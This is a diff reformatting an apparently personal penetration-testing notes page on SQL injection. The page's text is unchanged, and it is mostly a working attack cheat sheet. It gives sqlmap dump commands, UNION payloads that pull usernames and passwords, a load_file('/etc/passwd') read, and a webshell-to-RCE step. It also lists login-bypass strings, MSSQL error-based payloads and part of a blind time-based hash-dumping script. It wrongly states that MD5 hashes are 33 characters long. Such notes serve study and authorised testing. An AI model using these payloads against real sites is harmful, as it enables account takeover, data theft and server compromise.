@@ -1,12 +1,12 @@
 ---
-description: >-
-  SQLi is a common web application vulnerability that is caused by unsanitized
-  user input being inserted into SQL queries.
+title: SQL Injection (SQLi)
+category: Web
+order: 3
 ---
 
-# SQL Injection
+SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries.
 
-## Automatization with sqlmap
+# Automatization with sqlmap
 
 ```
 # Post
@@ -19,17 +19,15 @@ sqlmap -u "http://example.com/index.php?id=1" -p id
 sqlmap -u http://example.com --dbms=mysql --crawl=3
 ```
 
-{% hint style="info" %}
-**Note:** `request.txt` is a request saved in BurpSuite.
-{% endhint %}
+> **Note:** `request.txt` is a request saved in BurpSuite.
 
-### Dumping a Table
+## Dumping a Table
 
 ```
 sqlmap -r request.txt -p username -D database_name -T table_name --dump
 ```
 
-## Union Attack
+# Union Attack
 
 When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database.
 
@@ -39,7 +37,7 @@ MySQL syntax for the example:
 $sql = "SELECT id, name, text FROM example WHERE id=" . $_GET['id'];
 ```
 
-### Column Number Enumeration
+## Column Number Enumeration
 
 After detect that the application is vulnerable to SQLi we need to know how many columns are queried. To do that task we are going to use order by to guess the number of columns retrieved. The idea is to increment the number until get an error.
 
@@ -50,7 +48,7 @@ After detect that the application is vulnerable to SQLi we need to know how many
 /index.php?id=1 order by 4 - ERROR
 ```
 
-### Output Layout
+## Output Layout
 
 Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields.
 
@@ -58,7 +56,7 @@ Now that we know how many columns are in the table, we can use this information 
 /index.php?id=1 union all select 1, 2, 3
 ```
 
-### Extracting Data from Database
+## Extracting Data from Database
 
 Now knowing that the third column is for descriptions, we can put there all information.
 
@@ -70,7 +68,7 @@ Now knowing that the third column is for descriptions, we can put there all info
 /index.php?id=1 union all select 1, username, passwords from users
 ```
 
-### Read files
+## Read files
 
 Some databases allows us to read or write files in the filesystem.
 
@@ -78,7 +76,7 @@ Some databases allows us to read or write files in the filesystem.
 /index.php?id=1 union all select 1, 2, load_file('/etc/passwd')
 ```
 
-### From SQLi to RCE
+## From SQLi to RCE
 
 Since we are allowed to upload files, we can upload a webshell to the web root.
 
@@ -88,11 +86,9 @@ Since we are allowed to upload files, we can upload a webshell to the web root.
 
 In case of exploiting a **Microsoft SQL Server** check this:
 
-{% content-ref url="../services/1433-microsoft-sql-server.md" %}
-[1433-microsoft-sql-server.md](../services/1433-microsoft-sql-server.md)
-{% endcontent-ref %}
+* [SQL Server](../../services/sql-server/)
 
-## Login Bypass
+# Login Bypass
 
 The most classic ones:
 
@@ -138,7 +134,7 @@ or true--
 ")) or (("x"))=(("x
 ```
 
-### Knowing the username
+## Knowing the username
 
 When we are aware of some username we can impersonate him with SQLi by introducing the username and commenting the rest of the SQL Query.
 
@@ -147,7 +143,7 @@ administrator'-- -
 administrator'# 
 ```
 
-## Error Based SQLi
+# Error Based SQLi
 
 Use CONVERT or CAST to force an ERROR and see the output of the query on errors logs.
 
@@ -174,11 +170,11 @@ a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 
 a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
 ```
 
-## Blind SQLi
+# Blind SQLi
 
 A SQLi is blind because we don't have access to the error log or any type of output which difficult a lot the process of exploitation.
 
-### Time Based
+## Time Based
 
 Since we are not aware about any type of error or output we can use sleeps.
 
@@ -188,7 +184,7 @@ Since we are not aware about any type of error or output we can use sleeps.
 
 If it loads for four seconds extra we know that the database is processing our `sleep()` command.
 
-### Dump tables
+## Dump tables
 
 It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field.
 
@@ -208,13 +204,11 @@ for i in range(1,33):
 print()
 ```
 
-{% hint style="info" %}
-**Note:** MD5 hash are hexadecimal with 33 character length.
-{% endhint %}
+> **Note:** MD5 hash are hexadecimal with 33 character length.
 
-{% embed url="https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md" %}
+* [https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
 
-## References
+# References
 
 * [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
 * [https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)
